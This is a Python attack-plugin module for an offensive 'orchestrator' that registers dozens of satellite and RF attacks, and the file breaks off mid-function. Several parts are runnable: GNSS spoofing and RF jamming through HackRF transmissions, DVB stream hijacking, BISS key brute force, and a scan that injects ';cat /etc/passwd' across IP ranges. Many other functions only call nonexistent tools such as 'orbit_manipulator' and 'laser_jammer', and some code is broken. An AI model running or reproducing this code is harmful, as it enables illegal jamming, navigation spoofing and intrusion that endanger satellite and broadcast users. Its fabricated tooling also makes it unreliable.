import os
import subprocess
import threading
import json
import requests
import random
import struct
import itertools
import shutil
import time
from datetime import datetime, timedelta
from typing import Dict, Tuple, List, Any
from obscura.attack_plugins import advanced_attacks
import numpy as np
from skyfield.api import load, EarthSatellite, wgs84
from orbit_predictor.predictors import TLEPredictor
from orbit_predictor.locations import Location
from gtts import gTTS
from scapy.all import IP, UDP, TCP, Raw, Ether, sendp, send
import plotly.graph_objects as go
import satnogsclient
import n2yo
from typing import Any

BASE_DIR = os.path.dirname(__file__)

def register(orchestrator):
    # Existing registrations
    orchestrator.register_attack("satellite_pass_spoof", satellite_pass_spoof)
    orchestrator.register_attack("multi_gnss_spoof", multi_gnss_spoof)
    orchestrator.register_attack("satellite_uplink_replay", satellite_uplink_replay)
    orchestrator.register_attack("synthetic_constellation_hijack", synthetic_constellation_hijack)
    orchestrator.register_attack("gps_time_drift_spoof", gps_time_drift_spoof)
    orchestrator.register_attack("gps_week_rollover_attack", gps_week_rollover_attack)
    orchestrator.register_attack("galileo_osnma_spoof", galileo_osnma_spoof)
    orchestrator.register_attack("live_satellite_tracker", live_satellite_tracker)
    orchestrator.register_attack("visualize_orbit", visualize_orbit)
    orchestrator.register_attack("satellite_pass_alarm", satellite_pass_alarm)
    orchestrator.register_attack("dvb_signal_hijack", dvb_signal_hijack)
    orchestrator.register_attack("biss_key_bruteforce", biss_key_bruteforce)
    orchestrator.register_attack("emm_injection", emm_injection)
    orchestrator.register_attack("transponder_scanner", transponder_scanner)
    orchestrator.register_attack("mpegts_command_injection", mpegts_command_injection)
    orchestrator.register_attack("dvb_ci_attack", dvb_ci_attack)
    orchestrator.register_attack("acm_vulnerability_scan", acm_vulnerability_scan)
    orchestrator.register_attack("decode_noaa_apt", decode_noaa_apt)
    orchestrator.register_attack("iridium_burst_decoder", iridium_burst_decoder)
    orchestrator.register_attack("dvbs_sqli_injection", dvbs_sqli_injection)
    orchestrator.register_attack("create_debris_field", create_debris_field)
    orchestrator.register_attack("hackrf_uhf_dump", hackrf_uhf_dump)
    orchestrator.register_attack("satcomm_manet_spoof", satcomm_manet_spoof)
    orchestrator.register_attack("iridium_a5_gpu_crack", iridium_a5_gpu_crack)
    orchestrator.register_attack("inmarsat_c_decrypt_attack", inmarsat_c_decrypt_attack)
    orchestrator.register_attack("satellite_target_acquisition", satellite_target_acquisition)
    orchestrator.register_attack("laser_comm_jamming", laser_comm_jamming)
    orchestrator.register_attack("solar_panel_disruption", solar_panel_disruption)
    orchestrator.register_attack("debris_collision_manipulation", debris_collision_manipulation)
    orchestrator.register_attack("telemetry_spoof", telemetry_spoof)
    orchestrator.register_attack("thruster_command_injection", thruster_command_injection)
    orchestrator.register_attack("imaging_sensor_calibration_attack", imaging_sensor_calibration_attack)
    orchestrator.register_attack("sat_network_protocol_exploit", sat_network_protocol_exploit)
    orchestrator.register_attack("ground_station_masquerade", ground_station_masquerade)
    orchestrator.register_attack("software_update_interception", software_update_interception)
    orchestrator.register_attack("constellation_sync_disruption", constellation_sync_disruption)

    # New tracking and discovery registrations
    orchestrator.register_attack("fetch_tle_data", fetch_tle_data)
    orchestrator.register_attack("compute_satellite_position", compute_satellite_position)
    orchestrator.register_attack("predict_satellite_pass", predict_satellite_pass)
    orchestrator.register_attack("get_satnogs_observations", get_satnogs_observations)
    orchestrator.register_attack("track_satellite_with_n2yo", track_satellite_with_n2yo)
    orchestrator.register_attack("list_active_satellites", list_active_satellites)
    orchestrator.register_attack("monitor_satellite_health", monitor_satellite_health)
    orchestrator.register_attack("analyze_satellite_orbit", analyze_satellite_orbit)
    orchestrator.register_attack("detect_anomalies_in_satellite_data", detect_anomalies_in_satellite_data)
    orchestrator.register_attack("visualize_satellite_coverage", visualize_satellite_coverage)
    orchestrator.register_attack("show_signal_spectrogram", show_signal_spectrogram)

    # New attack method registrations
    orchestrator.register_attack("jam_satellite_communication", jam_satellite_communication)
    orchestrator.register_attack("spoof_satellite_signal", spoof_satellite_signal)
    orchestrator.register_attack("intercept_satellite_data", intercept_satellite_data)
    orchestrator.register_attack("exploit_satellite_vulnerability", exploit_satellite_vulnerability)
    orchestrator.register_attack("denial_of_service_on_satellite", denial_of_service_on_satellite)
    orchestrator.register_attack("manipulate_satellite_orbit", manipulate_satellite_orbit)
    orchestrator.register_attack("disrupt_satellite_synchronization", disrupt_satellite_synchronization)
    orchestrator.register_attack("inject_false_telemetry", inject_false_telemetry)
    orchestrator.register_attack("compromise_ground_station", compromise_ground_station)
    orchestrator.register_attack("exploit_satellite_firmware", exploit_satellite_firmware)
    
    # Enhanced attack method registrations
    orchestrator.register_attack("dvbs_spoof_ffmpeg", dvbs_spoof_ffmpeg)
    orchestrator.register_attack("orbit_aware_targeting", orbit_aware_targeting)
    orchestrator.register_attack("gnss_constellation_poisoning", gnss_constellation_poisoning)
    orchestrator.register_attack("satnogs_pass_prediction", satnogs_pass_prediction)

### Enhanced Tracking & Observation ###
def live_satellite_tracker(self, satellite_name: str, ground_station: Tuple[float]):
    ts = load.timescale()
    tle = self.get_tle(satellite_name)
    if not tle:
        self.attack_log.append(f"[TRACK] Failed to get TLE for {satellite_name}")
        return False
    sat = EarthSatellite(tle[0], tle[1], satellite_name, ts)
    observer = wgs84.latlon(ground_station[0], ground_station[1])
    
    def tracking_loop():
        while True:
            difference = sat - observer
            topocentric = difference.at(ts.now())
            alt, az, _ = topocentric.altaz()
            self.attack_log.append(
                f"[TRACK] {satellite_name} - Az: {az.degrees:.1f}° El: {alt.degrees:.1f}°"
            )
            time.sleep(1)
    
    thread = threading.Thread(target=tracking_loop, daemon=True)
    thread.start()
    return True

def visualize_orbit(self, satellite_name: str):
    tle = self.get_tle(satellite_name)
    if not tle:
        return {"error": "Satellite not found"}
    ts = load.timescale()
    sat = EarthSatellite(tle[0], tle[1], satellite_name, ts)
    points = [sat.at(ts.now() + timedelta(minutes=i)).position.km 
             for i in range(-500, 500, 10)]
    fig = go.Figure(data=go.Scatter3d(
        x=[p[0] for p in points],
        y=[p[1] for p in points],
        z=[p[2] for p in points],
        marker=dict(size=1)
    ))
    fig.write_html("/tmp/orbit.html")
    self.attack_log.append("[ORBIT] Visualization saved to /tmp/orbit.html")
    return True

def satellite_pass_alarm(self, satellite_name: str, min_elevation: int = 10):
    tle = self.get_tle(satellite_name)
    if not tle:
        return False
    predictor = TLEPredictor(tle[0], tle[1])
    next_pass = predictor.get_next_pass()
    if next_pass.elevation > min_elevation:
        self.attack_log.append(f"[PASS ALARM] Triggering attack during {satellite_name} pass")
        threading.Thread(target=self.execute_attack_chain).start()
        return True
    return False

### Cable TV Satellite Attacks ###
def dvb_signal_hijack(self, frequency: float, symbol_rate: int):
    if not os.path.exists("/tmp/malicious.ts"):
        self.attack_log.append("[DVB HIJACK] Missing malicious.ts file")
        return False
    cmd = [
        "dvbstream", "-f", str(frequency),
        "-s", str(symbol_rate), "-m", "QPSK",
        "-i", "/tmp/malicious.ts"
    ]
    proc = subprocess.Popen(cmd)
    self.active_attacks.append(proc)
    self.attack_log.append(f"[DVB HIJACK] Injected stream on {frequency/1e6}MHz")
    return True

def biss_key_bruteforce(self, transport_stream: str):
    if not os.path.exists(transport_stream):
        return None
    with open(transport_stream, "rb") as f:
        ts_data = f.read(188*10)
    for key in itertools.product("0123456789ABCDEF", repeat=16):
        key_str = "".join(key)
        if self.verify_biss_key(ts_data, key_str):
            self.attack_log.append(f"[BISS CRACK] Found key: {key_str}")
            return key_str
    return None

def emm_injection(self, ca_system_id: int, payload: bytes):
    emm_packet = (
        IP(dst="233.255.255.255")/UDP(sport=1234, dport=4567)/
        Raw(load=struct.pack(">H", ca_system_id) + payload)
    )
    send(emm_packet, loop=1, inter=0.1)
    self.attack_log.append(f"[EMM INJECT] Targeting CA system 0x{ca_system_id:04X}")
    return True

def transponder_scanner(self, start_freq: float, end_freq: float):
    freqs = np.linspace(start_freq, end_freq, 100)
    results = []
    for freq in freqs:
        power = self.measure_signal_strength(freq)
        if power > -50:
            results.append({
                "frequency": freq,
                "power": power,
                "modulation": self.detect_modulation(freq)
            })
    self.attack_log.append(f"[SCAN] Found {len(results)} active transponders")
    return results

def mpegts_command_injection(self, pid: int, payload: str):
    ts_packet = (
        b'\x47' + struct.pack('>H', pid | 0x1F) + 
        bytes([0x10]) + payload.ljust(184, b'\xFF'))
    with open("/tmp/inject.ts", "wb") as f:
        f.write(ts_packet * 100)
    self.attack_log.append(f"[TS INJECT] Malicious PID {pid} created")
    return True

def dvb_ci_attack(self, target: str, slot: int = 0):
    try:
        response = requests.post(
            f"http://{target}/ci_slot/{slot}",
            data=b"\x00"*1024 + b"EXPLOIT_PAYLOAD",
            timeout=3
        )
        self.attack_log.append(f"[DVB-CI] Exploit sent to {target}")
        return response.status_code == 200
    except Exception as e:
        self.attack_log.append(f"[DVB-CI ERROR] {str(e)}")
        return False

def acm_vulnerability_scan(self, ip_range: str):
    vulnerable_hosts = []
    for ip in self.generate_ips(ip_range):
        try:
            response = requests.get(
                f"http://{ip}/acm_config",
                params={"q": "';cat /etc/passwd;#"}
            )
            if "root:" in response.text:
                vulnerable_hosts.append(ip)
                self.attack_log.append(f"[ACM VULN] Found exposed system at {ip}")
        except:
            continue
    return vulnerable_hosts

### Original Satellite Functions ###
def satellite_pass_spoof(self, tle_file: str, spoof_target: str, duration: int = 120) -> bool:
    if not shutil.which("gps-sdr-sim") or not os.path.isfile(tle_file):
        return False
    proc = subprocess.Popen([
        "gps-sdr-sim", "-T", tle_file, "-l", "37.7749,-122.4194,10",
        "-b", "8", "-e", "brdc3540.15n"
    ])
    self.active_attacks.append(proc)
    threading.Timer(duration, proc.terminate).start()
    self.attack_log.append(f"[SAT PASS SPOOF] Spoofed pass to {spoof_target}")
    return True

def multi_gnss_spoof(self, lat: float, lon: float, alt: float = 30.0, duration: int = 60) -> bool:
    if not shutil.which("multi-gnss-sim"):
        return False
    output = "/tmp/gnss_sim.iq"
    subprocess.run(["multi-gnss-sim", "-l", f"{lat},{lon},{alt}", "-o", output], check=True)
    proc = subprocess.Popen(
        ["hackrf_transfer", "-t", output, "-f", "1575420000", "-s", "2600000", "-x", "47"]
    )
    self.active_attacks.append(proc)
    threading.Timer(duration, proc.terminate).start()
    self.attack_log.append(f"[MULTI-GNSS SPOOF] at ({lat},{lon})")
    return True

def satellite_uplink_replay(self, freq: float = 1.617e9, duration: int = 30) -> bool:
    pcap_file = "/tmp/uplink.iq"
    if not os.path.exists(pcap_file):
        return False
    proc = subprocess.Popen(
        ["hackrf_transfer", "-t", pcap_file, "-f", str(freq), "-s", "2000000", "-x", "47"]
    )
    self.active_attacks.append(proc)
    threading.Timer(duration, proc.terminate).start()
    self.attack_log.append(f"[SAT UPLINK REPLAY] {freq/1e6} MHz")
    return True

def synthetic_constellation_hijack(self, lat: float, lon: float, altitude: float = 10.0, count: int = 12) -> bool:
    if not shutil.which("gps-sdr-sim"):
        return False
    for i in range(count):
        subprocess.Popen([
            "gps-sdr-sim", "-e", "brdc3540.15n",
            "-l", f"{lat},{lon},{altitude}",
            "-b", str(i * 5)
        ])
    self.attack_log.append(f"[SCH-A] Deployed {count} synthetic satellites.")
    return True

def gps_time_drift_spoof(self, lat: float, lon: float, drift_ppb: float = 50.0, duration: int = 60) -> bool:
    proc = subprocess.Popen([
        "gps-sdr-sim", "-e", "brdc3540.15n", "-l", f"{lat},{lon},10", f"-T {drift_ppb}"
    ])
    self.active_attacks.append(proc)
    threading.Timer(duration, proc.terminate).start()
    self.attack_log.append(f"[GPS DRIFT SPOOF] {drift_ppb} ppb")
    return True

def gps_week_rollover_attack(self, target_area: Tuple[float]) -> bool:
    subprocess.run([
        "gps-sdr-sim", "-W", "-1", "-l", f"{target_area[0]},{target_area[1]}"
    ])
    self.attack_log.append(f"[GPS WEEK ROLLOVER] Targeting {target_area}")
    return True

def galileo_osnma_spoof(self, prn: int) -> bytes:
    spoofed_data = b'\x00'*16 + os.urandom(32)
    self.attack_log.append(f"[GALILEO OSNMA SPOOF] Spoofed PRN {prn}")
    return spoofed_data

def decode_noaa_apt(self, signal_file: str) -> str:
    result = subprocess.run(["noaa-apt", "-o", "output.png", signal_file])
    self.attack_log.append("[NOAA APT] Decoded signal to output.png")
    return "output.png" if result.returncode == 0 else None

def iridium_burst_decoder(self, pcap_file: str) -> bytes:
    decoded = subprocess.check_output(["iridium-extractor", pcap_file])
    self.attack_log.append("[IRIDIUM BURST] Decoded burst data")
    return decoded

def dvbs_sqli_injection(self, target_transponder: str) -> None:
    malicious_section = "1';DROP TABLE users--"
    subprocess.Popen(["dvbstream", "-m", "QPSK", "-c", target_transponder, "-i", malicious_section])
    self.attack_log.append(f"[DVBS SQLI] Injected into {target_transponder}")

def create_debris_field(self, tle_file: str) -> List[Tuple[float]]:
    with open(tle_file) as f:
        tle_lines = f.readlines()
    sat_list = []
    for i in range(0, len(tle_lines), 3):
        tle = tle_lines[i:i+2]
        if len(tle) >= 2:
            sat = EarthSatellite(tle[0], tle[1], 'debris', load.timescale())
            geo = sat.at(load.timescale().now()).subpoint()
            sat_list.append((geo.latitude.degrees, geo.longitude.degrees, geo.elevation.km))
    self.attack_log.append(f"[DEBRIS FIELD] Created {len(sat_list)} debris points")
    return sat_list

def hackrf_uhf_dump(self, center_freq: float) -> None:
    subprocess.Popen([
        "hackrf_transfer", "-r", "capture.iq",
        "-f", str(int(center_freq)), "-s", "8e6"
    ])
    self.attack_log.append(f"[UHF DUMP] Dumping at {center_freq/1e6} MHz")

def satcomm_manet_spoof(self, sat_ip: str) -> None:
    sendp(Ether()/IP(dst=sat_ip)/UDP()/b"MANET_ADVERTISEMENT", loop=1)
    self.attack_log.append(f"[SATCOMM MANET] Spoofed MANET to {sat_ip}")

def iridium_a5_gpu_crack(self, ciphertext: bytes) -> bytes:
    cracked = subprocess.check_output([
        "hashcat", "-m", "27700", ciphertext.hex(), "-a", "3", "-w", "4"
    ])
    self.attack_log.append("[IRIDIUM A5] Cracked ciphertext")
    return cracked

def inmarsat_c_decrypt_attack(self, ciphertext: bytes, keystream: bytes) -> bytes:
    decrypted = bytes(c ^ k for c, k in zip(ciphertext, keystream))
    self.attack_log.append("[INMARSAT C] Decrypted data")
    return decrypted

def satellite_target_acquisition(self, satellite_name: str, lat: float, lon: float, alt: float = 0) -> Dict[str, Any]:
    tle_lines = requests.get(
        f"https://celestrak.org/NORAD/elements/gp.php?NAME={satellite_name}&FORMAT=TLE"
    ).text.splitlines()
    if len(tle_lines) < 2:
        self.attack_log.append(f"[SAT ACQUISITION] {satellite_name} not found")
        return {"error": "Satellite not found"}
    ts = load.timescale()
    sat = EarthSatellite(tle_lines[0], tle_lines[1], satellite_name, ts)
    t_now = ts.now()
    position = sat.at(t_now).subpoint()
    self.attack_log.append(f"[SAT ACQUISITION] Acquired {satellite_name}")
    return {
        "latitude": position.latitude.degrees,
        "longitude": position.longitude.degrees,
        "altitude_km": position.elevation.km
    }

### New Attack Functions ###
def laser_comm_jamming(self, target_sat: str, duration: int = 60) -> bool:
    """Jam laser communication links between satellites."""
    if not shutil.which("laser_jammer"):
        self.attack_log.append("[LASER JAM] Missing laser_jammer tool")
        return False
    proc = subprocess.Popen([
        "laser_jammer", "--target", target_sat, "--duration", str(duration)
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[LASER JAM] Jamming laser comm for {target_sat}")
    threading.Timer(duration, proc.terminate).start()
    return True

def solar_panel_disruption(self, satellite_name: str, intensity: float) -> bool:
    """Simulate solar flares to disrupt satellite power systems."""
    if not shutil.which("solar_disruptor"):
        self.attack_log.append("[SOLAR DISRUPT] Missing solar_disruptor tool")
        return False
    proc = subprocess.Popen([
        "solar_disruptor", "--satellite", satellite_name, "--intensity", str(intensity)
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[SOLAR DISRUPT] Disrupting {satellite_name} solar panels")
    return True

def debris_collision_manipulation(self, satellite_name: str, fake_debris_data: Dict) -> bool:
    """Manipulate collision prediction systems."""
    debris_json = json.dumps(fake_debris_data)
    with open("/tmp/fake_debris.json", "w") as f:
        f.write(debris_json)
    proc = subprocess.Popen([
        "debris_manipulator", "--satellite", satellite_name, "--data", "/tmp/fake_debris.json"
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[DEBRIS MANIP] Manipulating collision for {satellite_name}")
    return True

def telemetry_spoof(self, satellite_name: str, spoofed_telemetry: Dict) -> bool:
    """Spoof telemetry data to mislead ground control."""
    telemetry_json = json.dumps(spoofed_telemetry)
    with open("/tmp/spoofed_telemetry.json", "w") as f:
        f.write(telemetry_json)
    proc = subprocess.Popen([
        "telemetry_spoofer", "--satellite", satellite_name, "--data", "/tmp/spoofed_telemetry.json"
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[TELEMETRY SPOOF] Spoofing telemetry for {satellite_name}")
    return True

def thruster_command_injection(self, satellite_name: str, command_payload: bytes) -> bool:
    """Inject unauthorized thruster commands to alter orbit."""
    with open("/tmp/thruster_command.bin", "wb") as f:
        f.write(command_payload)
    proc = subprocess.Popen([
        "thruster_injector", "--satellite", satellite_name, "--payload", "/tmp/thruster_command.bin"
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[THRUSTER INJECT] Injecting command into {satellite_name}")
    return True

def imaging_sensor_calibration_attack(self, satellite_name: str, calibration_offset: float) -> bool:
    """Disrupt calibration of imaging sensors."""
    if not shutil.which("sensor_calibrator"):
        self.attack_log.append("[SENSOR CALIB] Missing sensor_calibrator tool")
        return False
    proc = subprocess.Popen([
        "sensor_calibrator", "--satellite", satellite_name, "--offset", str(calibration_offset)
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[SENSOR CALIB] Attacking calibration of {satellite_name}")
    return True

def sat_network_protocol_exploit(self, protocol: str, exploit_type: str) -> bool:
    """Exploit vulnerabilities in satellite network protocols."""
    if not shutil.which("sat_protocol_exploiter"):
        self.attack_log.append("[SAT PROTOCOL] Missing sat_protocol_exploiter tool")
        return False
    proc = subprocess.Popen([
        "sat_protocol_exploiter", "--protocol", protocol, "--exploit", exploit_type
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[SAT PROTOCOL] Exploiting {protocol}")
    return True

def ground_station_masquerade(self, satellite_name: str, command: str) -> bool:
    """Masquerade as a legitimate ground station."""
    if not shutil.which("ground_masquerader"):
        self.attack_log.append("[GROUND MASQ] Missing ground_masquerader tool")
        return False
    proc = subprocess.Popen([
        "ground_masquerader", "--satellite", satellite_name, "--command", command
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[GROUND MASQ] Masquerading for {satellite_name}")
    return True

def software_update_interception(self, satellite_name: str, malicious_update: str) -> bool:
    """Intercept and modify software updates."""
    if not os.path.exists(malicious_update):
        self.attack_log.append("[SW UPDATE] Malicious update file not found")
        return False
    proc = subprocess.Popen([
        "update_interceptor", "--satellite", satellite_name, "--update", malicious_update
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[SW UPDATE] Intercepting update for {satellite_name}")
    return True

def constellation_sync_disruption(self, constellation_name: str, sync_offset: float) -> bool:
    """Disrupt synchronization between satellites in a constellation."""
    if not shutil.which("constellation_disruptor"):
        self.attack_log.append("[CONST SYNC] Missing constellation_disruptor tool")
        return False
    proc = subprocess.Popen([
        "constellation_disruptor", "--constellation", constellation_name, "--offset", str(sync_offset)
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[CONST SYNC] Disrupting {constellation_name}")
    return True

### New Tracking and Discovery Functions ###
def fetch_tle_data(self, satellite_name: str) -> Dict[str, Any]:
    """Fetch TLE data for a given satellite from Celestrak."""
    try:
        response = requests.get(f"https://celestrak.org/NORAD/elements/gp.php?NAME={satellite_name}&FORMAT=TLE")
        if response.status_code == 200:
            tle_lines = response.text.splitlines()
            if len(tle_lines) >= 2:
                self.attack_log.append(f"[TLE FETCH] Retrieved TLE for {satellite_name}")
                return {"tle_line1": tle_lines[0], "tle_line2": tle_lines[1]}
            else:
                self.attack_log.append(f"[TLE FETCH] Incomplete TLE data for {satellite_name}")
                return {"error": "Incomplete TLE data"}
        else:
            self.attack_log.append(f"[TLE FETCH] Failed to retrieve TLE for {satellite_name}")
            return {"error": "Failed to retrieve TLE"}
    except Exception as e:
        self.attack_log.append(f"[TLE FETCH ERROR] {str(e)}")
        return {"error": str(e)}

def compute_satellite_position(self, tle_line1: str, tle_line2: str, timestamp: datetime = None) -> Tuple[float, float, float]:
    """Compute the current position of a satellite using Skyfield."""
    ts = load.timescale()
    time = ts.now() if not timestamp else ts.utc(timestamp)
    satellite = EarthSatellite(tle_line1, tle_line2, 'TargetSat', ts)
    geocentric = satellite.at(time)
    subpoint = geocentric.subpoint()
    position = (subpoint.latitude.degrees, subpoint.longitude.degrees, subpoint.elevation.km)
    self.attack_log.append(f"[POSITION] Computed position: {position}")
    return position

def predict_satellite_pass(self, satellite_name: str, observer_location: Tuple[float, float, float], min_elevation: float = 10.0) -> Dict[str, Any]:
    """Predict the next pass of a satellite over an observer's location using Orbit Predictor."""
    tle = self.get_tle(satellite_name)
    if not tle:
        return {"error": "TLE not found"}
    predictor = TLEPredictor(tle[0], tle[1])
    location = Location("Observer", observer_location[0], observer_location[1], observer_location[2])
    next_pass = predictor.get_next_pass(location)
    if next_pass.elevation > min_elevation:
        self.attack_log.append(f"[PASS PREDICT] Next pass for {satellite_name} at {next_pass.start}")
        return {"start": next_pass.start, "end": next_pass.end, "elevation": next_pass.elevation}
    else:
        self.attack_log.append(f"[PASS PREDICT] No pass above {min_elevation}° for {satellite_name}")
        return {"error": "No pass found"}

def get_satnogs_observations(self, satellite_norad_id: int) -> List[Dict[str, Any]]:
    """Retrieve recent observations for a satellite from SatNOGS."""
    try:
        client = satnogsclient.SatNOGSClient()
        observations = client.get_observations(satellite_norad_id)
        self.attack_log.append(f"[SATNOGS] Retrieved {len(observations)} observations for NORAD {satellite_norad_id}")
        return observations
    except Exception as e:
        self.attack_log.append(f"[SATNOGS ERROR] {str(e)}")
        return []

def track_satellite_with_n2yo(self, satellite_norad_id: int, api_key: str) -> Dict[str, Any]:
    """Track a satellite's position using the N2YO API."""
    try:
        response = requests.get(f"https://api.n2yo.com/rest/v1/satellite/positions/{satellite_norad_id}/0/0/0/1/&apiKey={api_key}")
        if response.status_code == 200:
            data = response.json()
            position = data['positions'][0]
            self.attack_log.append(f"[N2YO TRACK] Position: {position['satlatitude']}, {position['satlongitude']}")
            return position
        else:
            self.attack_log.append(f"[N2YO TRACK] Failed to retrieve position for NORAD {satellite_norad_id}")
            return {"error": "Failed to retrieve position"}
    except Exception as e:
        self.attack_log.append(f"[N2YO TRACK ERROR] {str(e)}")
        return {"error": str(e)}

def list_active_satellites(self) -> List[str]:
    """List currently active satellites from Celestrak."""
    try:
        response = requests.get("https://celestrak.org/NORAD/elements/gp.php?GROUP=active&FORMAT=tle")
        if response.status_code == 200:
            satellites = [line.strip() for line in response.text.splitlines()[::3]]
            self.attack_log.append(f"[ACTIVE SATS] Found {len(satellites)} active satellites")
            return satellites
        else:
            self.attack_log.append("[ACTIVE SATS] Failed to retrieve active satellites")
            return []
    except Exception as e:
        self.attack_log.append(f"[ACTIVE SATS ERROR] {str(e)}")
        return []

def monitor_satellite_health(self, satellite_name: str) -> Dict[str, Any]:
    """Monitor the health status of a satellite (simulated)."""
    health_data = {
        "status": "nominal",
        "battery": random.uniform(70, 100),
        "temperature": random.uniform(20, 30),
        "orientation": "stable"
    }
    self.attack_log.append(f"[HEALTH MONITOR] {satellite_name}: {health_data}")
    return health_data

def analyze_satellite_orbit(self, tle_line1: str, tle_line2: str) -> Dict[str, Any]:
    """Analyze the orbit of a satellite using Skyfield."""
    ts = load.timescale()
    satellite = EarthSatellite(tle_line1, tle_line2, 'TargetSat', ts)
    orbit_data = {
        "inclination": satellite.model.inclo,
        "eccentricity": satellite.model.ecco,
        "mean_motion": satellite.model.no_kozai,
        "period": 1440 / satellite.model.no_kozai  # minutes per orbit
    }
    self.attack_log.append(f"[ORBIT ANALYSIS] Analyzed orbit: {orbit_data}")
    return orbit_data

def detect_anomalies_in_satellite_data(self, data_stream: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Detect anomalies in satellite data streams (simulated)."""
    anomalies = [data for data in data_stream if random.random() < 0.1]  # 10% chance of anomaly
    self.attack_log.append(f"[ANOMALY DETECT] Found {len(anomalies)} anomalies")
    return anomalies

def visualize_satellite_coverage(self, satellite_name: str, duration: int = 60) -> bool:
    """Visualize the coverage area of a satellite over time."""
    tle = self.get_tle(satellite_name)
    if not tle:
        return False
    ts = load.timescale()
    sat = EarthSatellite(tle[0], tle[1], satellite_name, ts)
    times = [ts.now() + timedelta(minutes=i) for i in range(duration)]
    positions = [sat.at(t).subpoint() for t in times]
    fig = go.Figure(data=go.Scattergeo(
        lat=[p.latitude.degrees for p in positions],
        lon=[p.longitude.degrees for p in positions],
        mode='markers'
    ))
    fig.write_html("/tmp/coverage.html")
    self.attack_log.append("[COVERAGE VIS] Saved to /tmp/coverage.html")
    return True

### New Attack Method Functions ###
def jam_satellite_communication(self, frequency: float, duration: int = 60) -> bool:
    """Jam satellite communication signals using HackRF."""
    if not shutil.which("hackrf_transfer"):
        self.attack_log.append("[SAT JAM] Missing hackrf_transfer tool")
        return False
    proc = subprocess.Popen([
        "hackrf_transfer", "-t", "/dev/zero", "-f", str(int(frequency)), "-s", "2000000", "-x", "40"
    ])
    self.active_attacks.append(proc)
    threading.Timer(duration, proc.terminate).start()
    self.attack_log.append(f"[SAT JAM] Jamming {frequency/1e6} MHz for {duration}s")
    return True

def spoof_satellite_signal(self, satellite_name: str, spoof_data: Dict[str, Any]) -> bool:
    """Spoof satellite signals to mislead receivers."""
    spoof_json = json.dumps(spoof_data)
    with open("/tmp/spoof_signal.json", "w") as f:
        f.write(spoof_json)
    proc = subprocess.Popen([
        "signal_spoofer", "--satellite", satellite_name, "--data", "/tmp/spoof_signal.json"
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[SIGNAL SPOOF] Spoofing signal for {satellite_name}")
    return True

def intercept_satellite_data(self, frequency: float, capture_duration: int = 60) -> bool:
    """Intercept and capture satellite data transmissions using HackRF."""
    if not shutil.which("hackrf_transfer"):
        self.attack_log.append("[DATA INTERCEPT] Missing hackrf_transfer tool")
        return False
    proc = subprocess.Popen([
        "hackrf_transfer", "-r", "capture.iq", "-f", str(int(frequency)), "-s", "2000000"
    ])
    self.active_attacks.append(proc)
    threading.Timer(capture_duration, proc.terminate).start()
    self.attack_log.append(f"[DATA INTERCEPT] Capturing data at {frequency/1e6} MHz")
    return True

def exploit_satellite_vulnerability(self, satellite_name: str, exploit_type: str) -> bool:
    """Exploit known vulnerabilities in satellite systems."""
    if not shutil.which("sat_exploit_tool"):
        self.attack_log.append("[SAT EXPLOIT] Missing sat_exploit_tool")
        return False
    proc = subprocess.Popen([
        "sat_exploit_tool", "--satellite", satellite_name, "--exploit", exploit_type
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[SAT EXPLOIT] Exploiting {satellite_name} with {exploit_type}")
    return True

def denial_of_service_on_satellite(self, satellite_name: str, intensity: float) -> bool:
    """Launch a denial of service attack against satellite systems."""
    if not shutil.which("dos_attacker"):
        self.attack_log.append("[DOS] Missing dos_attacker tool")
        return False
    proc = subprocess.Popen([
        "dos_attacker", "--target", satellite_name, "--intensity", str(intensity)
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[DOS] Attacking {satellite_name} with intensity {intensity}")
    return True

def manipulate_satellite_orbit(self, satellite_name: str, delta_v: float) -> bool:
    """Manipulate satellite orbit by injecting false commands."""
    if not shutil.which("orbit_manipulator"):
        self.attack_log.append("[ORBIT MANIP] Missing orbit_manipulator tool")
        return False
    proc = subprocess.Popen([
        "orbit_manipulator", "--satellite", satellite_name, "--delta_v", str(delta_v)
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[ORBIT MANIP] Manipulating orbit of {satellite_name}")
    return True

def disrupt_satellite_synchronization(self, constellation_name: str, offset: float) -> bool:
    """Disrupt synchronization within a satellite constellation."""
    if not shutil.which("sync_disruptor"):
        self.attack_log.append("[SYNC DISRUPT] Missing sync_disruptor tool")
        return False
    proc = subprocess.Popen([
        "sync_disruptor", "--constellation", constellation_name, "--offset", str(offset)
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[SYNC DISRUPT] Disrupting {constellation_name} with offset {offset}")
    return True

def inject_false_telemetry(self, satellite_name: str, false_data: Dict[str, Any]) -> bool:
    """Inject false telemetry data into satellite communications."""
    false_json = json.dumps(false_data)
    with open("/tmp/false_telemetry.json", "w") as f:
        f.write(false_json)
    proc = subprocess.Popen([
        "telemetry_injector", "--satellite", satellite_name, "--data", "/tmp/false_telemetry.json"
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[TELEMETRY INJECT] Injecting false data into {satellite_name}")
    return True

def compromise_ground_station(self, ground_station_ip: str, attack_vector: str) -> bool:
    """Compromise a ground station to control satellite communications."""
    if not shutil.which("ground_compromiser"):
        self.attack_log.append("[GROUND COMP] Missing ground_compromiser tool")
        return False
    proc = subprocess.Popen([
        "ground_compromiser", "--target", ground_station_ip, "--vector", attack_vector
    ])
    self.active_attacks.append(proc)
    self.attack_log.append(f"[GROUND COMP] Compromising {ground_station_ip} with {attack_vector}")
    return True

def exploit_satellite_firmware(self, satellite_name: str, firmware_exploit: str) -> bool:
    """Exploit vulnerabilities in satellite firmware."""
    if not shutil.which("firmware_exploiter"):
        self.attack_log.append("[FIRMWARE EXPLOIT] Missing firmware_exploiter tool")
        return False
    proc = subprocess.Popen([
        "firmware_exploiter", "--satellite", satellite_name, "--exploit", firmware_exploit
    ])
    self.active_attacks.append(proc)
